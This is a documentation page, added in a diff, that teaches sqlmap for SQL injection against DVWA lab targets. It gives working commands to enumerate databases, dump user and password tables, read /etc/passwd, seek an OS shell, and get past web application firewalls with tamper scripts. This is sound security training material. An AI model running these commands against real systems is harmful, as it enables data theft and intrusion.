@@ -1,0 +1,189 @@
+---
+title: "sqlmap — Automatic SQL Injection"
+description: SQLMap automatically detects and exploits SQL injection vulnerabilities in web applications
+sidebar:
+  order: 9
+---
+
+## What It Does
+
+SQLMap automatically detects and exploits SQL injection vulnerabilities in web applications. It answers: is this parameter injectable, what database is behind it, and what data can be extracted?
+
+## Running the Examples Script
+
+```bash
+# Requires a target argument (URL with parameters)
+bash scripts/sqlmap/examples.sh <target>
+
+# Or via Makefile
+make sqlmap TARGET=<target>
+
+# Examples with lab targets
+bash scripts/sqlmap/examples.sh http://localhost:8080
+bash scripts/sqlmap/examples.sh http://localhost:8080/vulnerabilities/sqli/?id=1
+```
+
+The script prints 10 example commands with explanations covering injection detection, database enumeration, data extraction, and WAF evasion.
+
+## Key Flags to Remember
+
+| Flag | What It Does |
+| ------ | ------------- |
+| `-u <url>` | Target URL with injectable parameter |
+| `--data='key=val'` | Test POST parameters |
+| `--dbs` | Enumerate all databases |
+| `-D <db> --tables` | List tables in a database |
+| `-D <db> -T <table> --dump` | Dump a table's contents |
+| `--batch` | Non-interactive mode (accept all defaults) |
+| `--level=5` | Maximum parameter testing (cookies, headers, etc.) |
+| `--risk=3` | Maximum payload aggressiveness (may modify data) |
+| `--tamper=<scripts>` | Apply tamper scripts to bypass WAF/IDS |
+| `-r <file>` | Load HTTP request from a saved file |
+| `--os-shell` | Attempt to get an OS shell via SQL injection |
+| `--technique=BEU` | Specify injection techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline) |
+
+## Extraction Progression (recommended order)
+
+1. `sqlmap -u '<url>?id=1' --batch` -- is the parameter injectable?
+2. `sqlmap -u '<url>?id=1' --batch --dbs` -- what databases exist?
+3. `sqlmap -u '<url>?id=1' --batch -D <db> --tables` -- what tables are in the database?
+4. `sqlmap -u '<url>?id=1' --batch -D <db> -T <table> --columns` -- what columns exist?
+5. `sqlmap -u '<url>?id=1' --batch -D <db> -T <table> --dump` -- extract the data
+
+## Use-Case Scripts
+
+### dump-database.sh -- Enumerate and extract database contents via SQL injection
+
+Demonstrates the full database extraction workflow through SQL injection using sqlmap. Covers the top-down approach from database discovery to dumping specific columns, reading server files with `--file-read`, and full automated extraction with threading.
+
+**When to use:** After confirming a SQL injection vulnerability exists. Follow the top-down approach: databases -> tables -> columns -> data.
+
+**Key commands:**
+
+```bash
+# Detect SQL injection and list all databases
+sqlmap -u 'http://target/page.php?id=1' --batch --dbs
+
+# List tables in a specific database
+sqlmap -u 'http://target/page.php?id=1' --batch -D dvwa --tables
+
+# List columns in a table
+sqlmap -u 'http://target/page.php?id=1' --batch -D dvwa -T users --columns
+
+# Dump specific columns from a table
+sqlmap -u 'http://target/page.php?id=1' --batch -D dvwa -T users -C user,password --dump
+
+# Read a file from the server (requires FILE privileges)
+sqlmap -u 'http://target/page.php?id=1' --batch --file-read=/etc/passwd
+
+# Full automated dump workflow with threading
+sqlmap -u 'http://target/page.php?id=1' --batch --dbs --tables --dump --threads=5
+```
+
+**Make target:** `make dump-db TARGET=<url>`
+
+---
+
+### test-all-parameters.sh -- Test all request parameters (GET, POST, cookies, headers) for SQLi
+
+Demonstrates how to thoroughly test all parameters in an HTTP request for SQL injection. Covers level/risk tuning, POST data, cookies, headers, and saved request files. Higher `--level` tests more parameter locations; higher `--risk` sends more aggressive payloads.
+
+**When to use:** When basic testing misses an injection point. Increase level to test cookies (level 2+) and headers (level 3+). Use `-r request.txt` when you need to replay complex requests captured from a browser.
+
+**Key commands:**
+
+```bash
+# Test all parameters with maximum level and risk
+sqlmap -u 'http://target/page.php?id=1' --batch --level=5 --risk=3
+
+# Test POST request data
+sqlmap -u 'http://target/page.php' --data="user=test&pass=test" --batch
+
+# Test from a saved HTTP request file (captured from browser DevTools)
+sqlmap -r request.txt --batch
+
+# Test a specific parameter only
+sqlmap -u 'http://target/page.php?id=1' --batch -p id
+
+# Test cookies for SQL injection (requires level 2+)
+sqlmap -u 'http://target/page.php?id=1' --cookie="PHPSESSID=abc123" --batch --level=2
+
+# Test HTTP headers for SQL injection (level 5)
+sqlmap -u 'http://target/page.php?id=1' --batch --level=5 --headers="X-Forwarded-For: 1*"
+
+# Verbose output for debugging failed detections
+sqlmap -u 'http://target/page.php?id=1' --batch -v 3 --level=3
+```
+
+**Make target:** `make test-params TARGET=<url>`
+
+---
+
+### bypass-waf.sh -- Use tamper scripts to evade WAF/IDS detection
+
+Demonstrates WAF/IDS evasion techniques using sqlmap tamper scripts. Tamper scripts modify SQL injection payloads before sending them, transforming syntax that WAFs block into equivalent SQL the database still understands. Includes recommended tamper combinations for specific WAFs (ModSecurity, Cloudflare, AWS WAF).
+
+**When to use:** When sqlmap detects a WAF or when injection attempts are being blocked. Start with a single tamper script and add more if still blocked. Use `--proxy` with Burp Suite to inspect modified payloads.
+
+**Key commands:**
+
+```bash
+# Space-to-comment bypass -- replaces spaces with /**/
+sqlmap -u 'http://target/page.php?id=1' --batch --tamper=space2comment
+
+# Combine multiple tamper scripts for stronger evasion
+sqlmap -u 'http://target/page.php?id=1' --batch --tamper=space2comment,between,randomcase
+
+# Random user agent + delay between requests
+sqlmap -u 'http://target/page.php?id=1' --batch --random-agent --delay=2
+
+# HTTP parameter pollution
+sqlmap -u 'http://target/page.php?id=1' --batch --hpp
+
+# Chunked transfer encoding -- splits payload across chunks
+sqlmap -u 'http://target/page.php?id=1' --batch --chunked
+
+# Route through a proxy for manual payload inspection
+sqlmap -u 'http://target/page.php?id=1' --batch --proxy=http://127.0.0.1:8080 --tamper=space2comment
+
+# List all available tamper scripts
+sqlmap --list-tampers
+```
+
+**Make target:** `make bypass-waf TARGET=<url>`
+
+## Practice Against Lab Targets
+
+```bash
+make lab-up
+
+# Set DVWA security to "low" first, then grab your session cookie:
+# 1. Browse to http://localhost:8080, log in (admin/password)
+# 2. Open DevTools -> Application -> Cookies -> copy PHPSESSID
+# 3. Navigate to SQL Injection page and note the URL format
+
+# Test DVWA for SQL injection
+sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie='security=low; PHPSESSID=<your-session-id>' --batch --dbs
+
+# Enumerate tables after finding databases
+sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie='security=low; PHPSESSID=<your-session-id>' --batch -D dvwa --tables
+
+# Dump user credentials
+sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie='security=low; PHPSESSID=<your-session-id>' --batch -D dvwa -T users --dump
+```
+
+## Notes
+
+- Always use `--batch` for non-interactive mode -- sqlmap asks many prompts by default
+- Use `--output-dir=./sqlmap-output` to organize results in a specific directory
+- SQLMap caches results per target -- delete the output directory to rescan from scratch
+- The `--technique` flag narrows which injection types to try (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
+- DVWA requires a valid session cookie -- log in via browser first, then copy `PHPSESSID` from DevTools
+- Higher `--level` values test more parameters but are significantly slower (level 5 tests all HTTP headers)
+- Higher `--risk` values (especially 3) can modify data with OR-based payloads -- use cautiously
+- Tamper scripts can be chained with commas: `--tamper=space2comment,between,randomcase`
+- Use `--dbms=mysql` if you know the database type to skip fingerprinting and speed up testing
+- Use `-v 3` for verbose output when debugging why detection is failing
